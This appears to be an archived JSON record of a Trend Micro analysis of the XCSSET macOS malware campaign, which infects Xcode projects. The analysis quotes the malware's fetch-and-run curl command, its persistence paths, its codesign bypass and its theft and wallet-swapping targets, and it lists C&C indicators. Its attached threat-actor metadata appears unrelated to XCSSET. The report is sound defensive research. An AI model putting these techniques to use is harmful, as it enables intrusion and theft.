{
    "id": "2cbbd7b5-155c-42c0-ae64-f2c228907f91",
    "created_at": "2023-01-12T15:01:44.681387Z",
    "updated_at": "2025-03-27T02:15:35.716168Z",
    "deleted_at": null,
    "sha1_hash": "6d11056c674f12a0e7b445a7af4399d202c22db6",
    "title": "2021-04-16 - XCSSET Quickly Adapts to macOS 11 and M1-based Macs",
    "authors": "",
    "file_creation_date": "2022-05-27T23:27:22Z",
    "file_modification_date": "2022-05-27T23:27:22Z",
    "file_size": 1666636,
    "plain_text": "# XCSSET Quickly Adapts to macOS 11 and M1-based Macs\n\n**[trendmicro.com/en_us/research/21/d/xcsset-quickly-adapts-to-macos-11-and-m1-based-macs.html](https://www.trendmicro.com/en_us/research/21/d/xcsset-quickly-adapts-to-macos-11-and-m1-based-macs.html)**\n\nApril 16, 2021\n\nThis latest update details our new research on XCSSET, including the ways in which it has adapted itself to work on both ARM64 and\nx86_x64 Macs.\n\nBy: Steven Du, Dechao Zhao, Luis Magisa, Ariel Neimond Lazaro April 16, 2021 Read time: ( words)\n\nLast year, we first found XCSSET, which targeted Mac users by infecting Xcode projects. Initially reported as a malware family, in light of\nour recent findings it is now classified as an ongoing campaign. This latest update details our new research regarding XCSSET, including\nthe ways in which it has adapted itself to work on both ARM64 and x86_x64 Macs, as well as other notable payload changes.\n\nIn our [first blog post and](https://www.trendmicro.com/en_us/research/20/h/xcsset-mac-malware--infects-xcode-projects--uses-0-days.html) [technical brief on XCSSET, we discussed at length the dangers it posed to Xcode developers and how it](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf)\n[exploited two macOS vulnerabilities to maximize what it can take from an infected machine. Our follow-up update covered the third exploit](https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief_Followup.pdf)\nwe found that takes advantage of other popular browsers in macOS to implant a Universal Cross-site Scripting (UXSS) injection.\n\n**Big changes for macOS 11 Big Sur**\n\nLast November, Apple released its operating system Big Sur alongside new Mac products equipped with ARM-based M1 processors.\nSoftware with x86_64 architecture can still run on macOS 11 with the help of Rosetta 2, an emulator built into Big Sur, but most software\ndevelopers may prefer to update their software so it can support ARM64.\n\nAccording to [Kaspersky, new samples from the malware were discovered that can run on Macs with the new M1 chip. We checked the](https://securelist.com/malware-for-the-new-apple-silicon-platform/101137/)\nbinary files downloaded from the command and control (C&C) server and discovered that nearly all of them were files containing both\nx86_x64 and ARM64 architectures, save for three that only had an x86_64 architecture. Besides adding support for the M1 chip,\nXCSSET malware has taken other actions to fit macOS 11 Big Sur as well.\n\nAs mentioned in our first technical brief, this malware leverages the development version of Safari to load malicious Safari frameworks\nand related JavaScript backdoors from its C&C server. It hosts Safari update packages in the C&C server, then downloads and installs\npackages for the user’s OS version. To adapt to the newly-released Big Sur, new packages for “Safari 14” were added (Figure 1). As\nwe’ve observed in safari_remote.applescript, it downloads a corresponding Safari package according to the user’s current browser and\nOS versions (Figure 2).\n\nFigure 1. Safari 14 packages\n\n\n-----\n\nFigure 2. safari_remote.applescript\nImitation apps for Big Sur are also created from malicious AppleScript files, in which icon files are downloaded from a C&C server, then\ntheir info.plist files are modified so that the fake app's icon is convincingly disguised as that of the legitimate app it's trying to imitate.\n\nThe malware's latest modules, such as the new icons.php module introduces changes to the icons to fit their victim's OS (Figure 5). For\nexample, a fake Finder's icon for macOS versions 10.15 and lower has a downloaded icon file named Finder.icns with square corners\n(Figure 3), whereas macOS 11.1 has a downloaded icon file named FinderBigSur.icns and has an icon with rounded corners (Figure 4) to\nmimic the ones used in Big Sur.\n\nFigure 3. Finder Icon (10.15)\n\nFigure 4. Finder Icon (11.1)\n\nFigure 5. The calling icons.php script\n\n## Getting past macOS 11’s security features\n\nThe beta 6 version of macOS Big Sur 11 onwards does include new security requirements to better detect any code modifications.\nExecutables must now be signed before they are allowed to run, though a simple ad-hoc signature will suffice. However, this doesn't\napply to translated x86 binaries that run under Rosetta 2, nor a macOS 11 that runs on an Intel-based platform.\n\nIn all AppleScript modules, instead of the open command a new launchApp function is used to execute a fake app made from malicious\nAppleScript (Figure 6).\n\n\n-----\n\nFigure 6. The launchApp calling function\nBut as we have seen from its source code, the malware can cleverly circumvent macOS 11's new security policies: Its fake apps and files\nare codesigned with an ad-hoc signature using the codesign --force --deep -s - command. The malware then downloads its own open tool\nfrom its C&C server that comes pre-signed with an ad-hoc signature, whereas if it were on macOS versions 10.15 and lower, it would still\nuse the system's built-in open command to run the apps.\n\nThe main routine of the open tool is as follows:\n\nRequire an app bundle as argument. For example: open xcode.app\nLaunch the {app bundle}\\Contents\\macOS\\applet\nCheck if the wait parameter is included, For example: open xcode.app wait\nLaunch the {app bundle}\\Contents\\macOS\\applet\nContinuously check if the target app is included in the running process using the following commands: /bin/bash -c ps aux | grep -v\n_grep | grep -ci '{app bundle}/Contents/macOS/applet' || echo 0 2>&1   &>/dev/null_\n\nInterestingly, even though the /usr/bin/open command works fine for fake apps on M1 systems, it still uses its own open tool.\n\nFigure 7.\n\nlaunchApp script\n**Other features and payloads of XCSSET**\n\nDays after we released our second technical brief on this malware, a new domain named \"trendmicronano[.]com” was added to its C&C\nserver. Although it contains the keywords \"trend micro\", it has nothing to do with Trend Micro. So far, six active C&C domains share the\nsame IP address of 94[.]130[.]27[.]189:\n\nTitian[.]com\nFindmymacs[.]com\nStatsmag[.]com\nStatsmag[.]xyz\nAdoberelations[.]com\nTrendmicronano[.]com\n\n## bootstrap.applescript\n\nThe bootstrap.applescript module, which is called by binary Pods and contains the logic to call other malicious AppleScript modules, has\nalso undergone some noteworthy changes:\n\n\n-----\n\nMachines with the username apple_mac, identified as physical machines with the M1 chip, are then used to test if new Mach O\nfiles with ARM architecture can work properly on M1 machines (Figure 8)\nCalls a new screen_sim module instead of a screen module (Figure 9)\nAdded support for Chromium browser (Figure 10)\nIn its previous version, we observed that the chrome_data and opera_data modules were only called when the language contains\n\"IN\" for India (Figure 11), but in this latest iteration the chrome_data module is called along with the replicator module. In addition,\nthe call for opera_data has been commented out (Figure 12)\n\nFigure 8. Testing code for the bootstrap.applescript\n\nmodule\n\nFigure 9. New component of the bootstrap.applescript module\n\nFigure 10. The\n\nbootstrap.applescript module added support for a new browser\n\nFigure 11. The previous version of the\n\nbootstrap.applescript module\n\nFigure 12. The latest version calls the replicator module\n**_replicator.applescript_**\n\nThe replicator.applescript module is responsible for injecting local Xcode projects with malicious code. We’ve observed that this module\nuses more varied file names in this latest version compared to its predecessor. The new file names used by this module are as follows:\n\nScript file names:\n\nAssets.xcassets\n\n\n-----\n\nAsset.xcasset\nxcassets.folder\nbuild.file\n\nMach-O file name:\n\ncat\n\nThe replicator.applescript module infects Xcode developer projects by inserting a function that calls its malicious components during the\nbuild phase or the build rule. In previous versions, these code snippets inserted in the build phase or build rule were assigned hard-coded\nIDs, but this latest iteration added a new function that automatically generates random IDs. According to its logic (Figure 13), this random\nID will always end with the postfix “AAC43A,” which is used to identify and remove the old infection snippet in preparation for a new\ninfection (Figure 14). We were able to locate 10 public GitHub repositories infected with this malware, but these all had old hard-coded\nIDs. Repositories infected with the latest variant have yet to be found.\n\nOriginally, the inserted script during the build phase or build rule calls a bash script file, which refers to Mach-O binary files as “Pods”\n(Figure 15). However, in this latest version, the script calls a Mach-O binary file “cat” directly and is assigned the value of the\nAUTO_CLEAN_PROJ variable, which is currently set to “false” (Figure 16).\n\nFigure 13. Random ID Generator\n\nFigure 14. Postfix use case\n\nFigure 15. The previous version of build phase script\n\nFigure 16. The latest version of build phase script\n**_agent.php_**\n\nIn our analysis of the latest JavaScript codes from agent.php, which hosts many of the codes used in handling requests to manipulate\nbrowsers, we’ve also discovered that, unlike its previous version, the malware now tries to steal confidential data from the following sites:\n\n163.com\nHuobi\n\n\n-----\n\nbinance.com\nnncall.net\nEnvato\nlogin.live.com\n\nFor cryptocurrency trading platform Huobi, the malware not only steals account information but is now able to replace the address in a\nuser’s cryptocurrency wallet — a new feature that did not exist in the previous version (Figure 18).\n\nFigure 17. Stealing Envato account information\n\nFigure 18. Replacing Huobi wallet addresses\n**New Findings on the Landing Mach-O File**\n\nAs previously discussed, we have found that nearly all the binary files that were downloaded directly from the C&C server have changed\nfrom Mach-O files with an x86_64 architecture to universal binary files with both x86_64 and ARM64 architectures, with three notable\nexceptions: “cat” and “Pods” are landing Mach-O binary files triggered by infected Xcode projects, while “open” is used to execute all fake\napps compiled from malicious AppleScript script files. Upon further investigation, we’ve come across new findings as to why these were\nnot updated to support ARM64:\n\n\n-----\n\nThe cat Mach O binary file is generated by the Shell Script Compiler (shc), an open source tool used to generate a local executable\nbinary file from an input shell script file. Users can find its source code from GitHub and easily install it using local package management\ntools like Homebrew for macOS, or Yellowdog Updater Modified (YUM) and apt-get for Linux. Although there is a tool called UnShc that\ncan decompile binary files generated by shc, it doesn’t work well for files from the latest version of shc.\n\nBecause of this, we still had to examine the payload from cat using proper debugging methods: First, we got a decrypted shell script from\n_cat, whose main payload is downloading and executing other Mach-O binary Pods from the C&C server (Figure 19). Pods, likewise_\ngenerated by shc, has the same file size as cat. We used the same debugging methods to procure a decrypted shell script from it.\n\nFigure 19. The “cat” Mach-O binary file\nOnce decrypted, the shell script from Pods were shown to be quite complicated and able to:\n\n1. 1Connect to https://$TARGET_DOMAIN/apple/prepod.php in an attempt to get remote command. The expected return result is\n\nAppleScript string. If the return result doesn’t come up empty, osascript -e is called to execute it. So far, the return result has been\nempty.\n2. Read $HOME/Library/Caches/GameKit/.report, and if this file exists, use its contents as the target directory. Otherwise, it randomly\n\nselects a path from the following:\n\n_\"$HOME/Library/Application Support/iCloud\"_\n_\"$HOME/Library/Application Scripts/com.apple.AddressBook.Shared\"_\n_\"$HOME/Library/Group Containers/group.com.apple.notes\"_\n_\"$HOME/Library/Containers/com.apple.routerd\"_\n\n\n-----\n\n3. Read $HOME/Library/Caches/GameKit/.plist, and if this file exists, use its contents as the path for a plist file of a persistent item.\n\nOtherwise, it randomly selects a path from the following:\n\n_\"$HOME/Library/LaunchAgents/com.apple.net.core.plist\"_\n_\"$HOME/Library/LaunchAgents/com.apple.auditor.plist\"_\n_\"$HOME/Library/LaunchAgents/com.google.keystone.plist\"_\n_\"$HOME/Library/LaunchAgents/com.google.keystone.plist\"_\n4. Use macOS’s osacompile command to compile embedded AppleScript (Figure 20) to acquire a fake Xcode.app. The embedded\n\nAppleScript contains some encrypted string, making it difficult to read. But after decrypting, we discovered its main payload:\n\n1. Send an http request to com.php by executing a command: curl -sk -d 'user=\n\n_<username>&build_vendor=default&build_version=default' https://<domainname>/apple/com.php. As a result, it obtains a new_\nAppleScript file’s content. Based on this, we believe it to be bootstrap.applescript.\n2. Use the osacompile -x command to compile the AppleScript content from the curl command to a run-only AppleScript, then\n\nexecute it.\n5. Create the file $HOME/Library/Caches/GameKit/AppleKit and write the path of Xcode.app’s main Mach-O file\n\n(Contents/macOS/applet) into it.\n6. Create the file $TARGET_PLIST_FILE that launches $HOME/Library/Caches/GameKit/AppleKit. Then it calls the launchctl load\n\ncommand to load the plist file, so the AppleKit file is executed, and in turn, execute the fake Xcode.app.\n7. Write the following files:\n\n_\"$HOME/Library/Caches/GameKit/.report\" – “$TARGETDIR/Xcode.app” compiled by malware_\n_\"$HOME/Library/Caches/GameKit/.plist\" – “$TARGET_PLIST_FILE” persistence created by malware_\n_\"$HOME/Library/Caches/GameKit/.domain\" - domain used by malware_\n8. Finally, an interesting function in the shell script is clean_proj (Figure 21), which is used to disinfect the current infected Xcode\n\nproject. The calling condition of clean_proj is “$AUTOCLEAN=true”(Figure 22), but as mentioned earlier, currently the variable’s\nvalue is false.\n\nFigure 20. Embedded AppleScript code\n\n\n-----\n\nFigure 21. Clean_proj for disinfection\n\n**Trend Micro Solutions**\n\n\nFigure 22. Disinfect only when AUTOCLEAN is true\n\n\nTo protect systems from this type of threat, users should only download apps from official and legitimate marketplaces. Users can also\n[consider multilayered security solutions such as Trend Micro Antivirus for Mac and](https://www.trendmicro.com/en_us/forHome/products/antivirus-for-mac.html) [Trend Micro Maximum Security, which provides](https://www.trendmicro.com/en_us/forHome/products/maximum-security.html)\ncomprehensive security and multidevice protection against cyberthreats.\n\nEnterprises can take advantage of Trend Micro’s [Smart Protection Suites with XGen™ security, which infuses high-fidelity machine](https://www.trendmicro.com/en_us/business/products/user-protection/sps.html)\nlearning into a blend of threat protection techniques to eliminate security gaps across any user activity or endpoint.\n\nIndicators of Compromise\n\nFilename SHA256 Trend Micro Detection Name\n\nreplicator.applescript 3631d9485d2e61bb86a71a007d5420d132938cc1f9dacbc6d2eef0dcd8dc040c Trojan.macOS.XCSSET.B\n\nsafari_remote.applescript 5acf6821d44545bfcd3446e2bdf589bc16972f76cc9137cb364954829df520d2 Trojan.macOS.XCSSET.B\n\npods_infect.applescript 66057e5672a0e3c564563f99881fc57b604e6c91a992b6a937d0077636200497 Trojan.macOS.XCSSET.B\n\ncat 74df6fee1c5d18dc8f0dad1263199ab4392088fd5faaae95ae05b377207fff05 TrojanSpy.macOS.XCSSET.B\n\nscreen_sim.applescript 86f3195ea91953e0e560ac474e34218a919c89ba433dc3a1eb935800b2acb7f7 Trojan.macOS.XCSSET.B\n\nPods shellscript 8aaf02565161bd88f033d2419104a4cb452a4808363b05cdff43b5781f78e01d Trojan.SH.XCSSET.B\n\nPods a018213ac9202119eb7a6d58603f8dbb2fdde26b9639d852e5e426ecbfc3545f TrojanSpy.macOS.XCSSET.B\n\ncat shellscript a191c9657abbc528640bd2217f479fbecb33c85ca0e37a2ea309225bb0cbf2ce Trojan.SH.XCSSET.B\n\nbootstrap.applescript cdbc86b5828fc6e8f9747bbd298bdf19d0047622c9e69f9b0877ee4106b3768 Trojan.macOS.XCSSET.\n\nIP/Domain Category\n\n94[.]130[.]27[.]189 C&C Server\n\nAdoberelations[.]com\n\nFindmymacs[.]com\n\nStatsmag[.]com\n\nStatsmag[.]xyz\n\nTitian[.]com\n\n\n-----\n\nTrendmicronano[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-04-16 - XCSSET Quickly Adapts to macOS 11 and M1-based Macs.pdf"
    ],
    "report_names": [
        "2021-04-16 - XCSSET Quickly Adapts to macOS 11 and M1-based Macs.pdf"
    ],
    "threat_actors": [
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8a33d3ac-14ba-441c-92c1-39975e9e1a73",
            "created_at": "2023-01-06T13:46:39.195689Z",
            "updated_at": "2025-03-27T02:00:03.01861Z",
            "deleted_at": null,
            "main_name": "Ghostwriter",
            "aliases": [
                "PUSHCHA",
                "Storm-0257",
                "DEV-0257",
                "UAC-0057",
                "UNC1151",
                "TA445"
            ],
            "source_name": "MISPGALAXY:Ghostwriter",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "119c8bea-816e-4799-942b-ff375026671e",
            "created_at": "2022-10-25T16:07:23.957309Z",
            "updated_at": "2025-03-27T02:02:10.048343Z",
            "deleted_at": null,
            "main_name": "Operation Ghostwriter",
            "aliases": [
                "DEV-0257",
                "Operation Asylum Ambuscade",
                "PUSHCHA",
                "Storm-0257",
                "TA445",
                "UAC-0051",
                "UAC-0057",
                "UNC1151"
            ],
            "source_name": "ETDA:Operation Ghostwriter",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "HALFSHELL",
                "Impacket",
                "RADIOSTAR",
                "VIDEOKILLER",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535704,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1653694042,
    "ts_modification_date": 1653694042,
    "files": {
        "pdf": "https://archive.orkl.eu/6d11056c674f12a0e7b445a7af4399d202c22db6.pdf",
        "text": "https://archive.orkl.eu/6d11056c674f12a0e7b445a7af4399d202c22db6.txt",
        "img": "https://archive.orkl.eu/6d11056c674f12a0e7b445a7af4399d202c22db6.jpg"
    }
}